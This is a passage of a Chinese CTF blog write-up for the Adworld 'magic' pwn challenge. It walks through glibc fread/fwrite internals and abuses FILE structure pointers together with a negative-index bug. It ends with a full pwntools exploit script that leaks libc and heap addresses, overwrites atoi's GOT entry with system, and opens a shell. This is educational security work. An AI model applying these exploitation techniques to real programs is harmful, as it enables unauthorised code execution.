+<span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_LINE_BUF</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">))</span>
+	<span class="n">count</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
+<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">&gt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">)</span>
+    <span class="n">count</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
+<span class="o">...</span>
+<span class="o">...</span>
+<span class="o">//</span> <span class="n">利用memcpy实现写</span><span class="err">，</span><span class="n">其中s为data地址</span>
+<span class="c1">#ifdef _LIBC</span>
+        <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">__mempcpy</span><span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+<span class="c1">#else</span>
+        <span class="n">memcpy</span><span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+        <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>我们想想如果在<code>fwrite</code> 中想改变<code>_IO_write_ptr</code>为A会发生什么，在执行<code>__memcpy</code> 前<code>_IO_write_ptr</code>均为原值B，但是s的内容为A（我们试图改变<code>_IO_write_ptr</code>为A），在<code>__memcpy</code>的过程中<code>_IO_write_ptr</code>确实被改为A了，但不要忘了 还需要将它的返回值赋给<code>_IO_write_ptr</code>，所以<code>_IO_write_ptr</code>变回了<code>B+count</code> ，一如正常执行后的结果！至此我们明白了，为什么<code>fwrite</code> 改变<code>_IO_write_ptr</code>并不奏效。</p>
+<h4 id="回归正题">回归正题</h4>
+<p>所以怎么利用<code>fread</code> 改写<code>_IO_write_ptr</code>，然后在下一次<code>wizard_spell</code> 中就能实现指定位置写呢？这里还是要从<code>fread</code> 源码入手，它的核心实现落到了<code>_IO_file_xsgetn</code> 上，部分源码如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">	<span class="o">...</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
+    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="n">unsigned</span> <span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+	<span class="o">...</span>
+	<span class="o">...</span>
+	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+	<span class="o">//</span><span class="n">调用系统接口读入</span>
+    <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSREAD</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
+                        <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里我们首先得绕过第一个判断（不然不读了），然后发现它把很多<code>FILE</code> 指针的值都变为了<code>_IO_buf_base </code>，包括 <code>_IO_write_ptr</code>。我们无法在<code>fwrite</code> 中顺利改变<code>_IO_write_ptr</code>，何不改变<code>_IO_buf_base </code>，然后在调用<code>fread</code> 后就能改变<code>_IO_write_ptr </code> 了。尝试一下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">log_file</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span> <span class="o">+</span> <span class="mh">0xAAA</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>很遗憾，调试发现并没有改写成功。</p>
+<p>我们想把<code>_IO_buf_base </code>赋值为<code>atoi_got</code> ，然后让<code>_IO_write_ptr </code> 也变为这个值。再回头看看<code>fwrite</code> 源码不难发现，由于<code>_IO_write_end </code>也被赋值为<code>_IO_buf_base </code>，所以在<code>fwrite</code> 中<code>count</code> 为0，不会再读了！</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_LINE_BUF</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">count</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
+        <span class="o">...</span>
+    <span class="p">}</span>
+<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">&gt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">)</span>
+        <span class="n">count</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span> <span class="o">/*</span> <span class="n">Space</span> <span class="n">available</span><span class="o">.</span> <span class="o">*/</span>
+
+    <span class="o">/*</span> <span class="n">Then</span> <span class="n">fill</span> <span class="n">the</span> <span class="n">buffer</span><span class="o">.</span> <span class="o">*/</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">to_do</span><span class="p">)</span>
+            <span class="n">count</span> <span class="o">=</span> <span class="n">to_do</span><span class="p">;</span>
+<span class="c1">#ifdef _LIBC</span>
+        <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">__mempcpy</span><span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+<span class="c1">#else</span>
+        <span class="n">memcpy</span><span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+        <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>好了，所以我们最终如下操作，先把<code>_IO_write_end </code>与<code>_IO_write_ptr </code>都改为<code>atoi_got + 143</code> ，最后再利用负下标漏洞把<code>_IO_write_ptr </code>向下滑倒<code>atoi_got</code> -1，于是目的就达成了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># change atoi to system</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">log_file</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span> <span class="o">+</span> <span class="mi">143</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span> <span class="o">+</span> <span class="mh">0xAAA</span><span class="p">))</span>
+
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="exp-1">exp</h3>
+<p>ubuntu16.04测试成功</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#! /usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./magic&#39;</span><span class="p">)</span>
+
+<span class="n">debug</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./magic&#39;</span><span class="p">)</span>
+<span class="n">atoi_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
+<span class="n">log_file</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;log_file&#39;</span><span class="p">]</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice&gt;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Give me the wizard&#39;s name:&#34;</span><span class="p">,</span> <span class="s1">&#39;aaa&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">spell</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice&gt;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Who will spell:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;Spell name:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">pause</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;pause&#39;</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">raw_input</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+<span class="c1"># gdb.attach(p)</span>
+<span class="n">create</span><span class="p">()</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;aaa&#39;</span><span class="p">)</span>
+<span class="c1">#pause()</span>
+
+
+
+<span class="c1"># leak libc</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span>
+    <span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">11</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad24a8</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">atoi_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atoi_addr</span><span class="p">)</span>
+
+<span class="c1"># gdb.attach(p)</span>
+<span class="n">offset</span><span class="o">=</span> <span class="n">atoi_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+
+
+<span class="c1"># leak heap</span>
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad24a8</span><span class="p">))</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">log_file</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">log_file</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">))</span>
+
+<span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x10</span>
+<span class="nb">print</span> <span class="s1">&#39;heap:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span>
+
+
+
+<span class="c1"># change atoi to system</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">log_file</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span> <span class="o">+</span> <span class="mi">143</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span> <span class="o">+</span> <span class="mh">0xAAA</span><span class="p">))</span>
+<span class="nb">print</span> <span class="s2">&#34;atoi_got:&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span>
+
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice&gt;&gt; &#39;</span><span class="p">,</span><span class="s1">&#39;$0&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-04-12</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2020/04/adworld-pwn0/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://xidoo.top/2020/04/adworld-pwn0/" data-title="攻防世界PWN进阶区 部分题解"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://xidoo.top/2020/04/adworld-pwn0/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://xidoo.top/2020/04/adworld-pwn0/" data-title="攻防世界PWN进阶区 部分题解" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://xidoo.top/2020/04/adworld-pwn0/" data-title="攻防世界PWN进阶区 部分题解"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://xidoo.top/2020/04/adworld-pwn0/" data-title="攻防世界PWN进阶区 部分题解"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="http://xidoo.top/2020/04/adworld-pwn0/" data-title="攻防世界PWN进阶区 部分题解" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://xidoo.top/2020/04/adworld-pwn0/" data-title="攻防世界PWN进阶区 部分题解" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://xidoo.top/2020/04/adworld-pwn0/" data-title="攻防世界PWN进阶区 部分题解"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/2020/05/whuctf2020/" class="next" rel="next" title="WHU CTF 2020">WHU CTF 2020<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">🏴‍☠️ Love it, Make magic</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">x1do0</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":15},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your 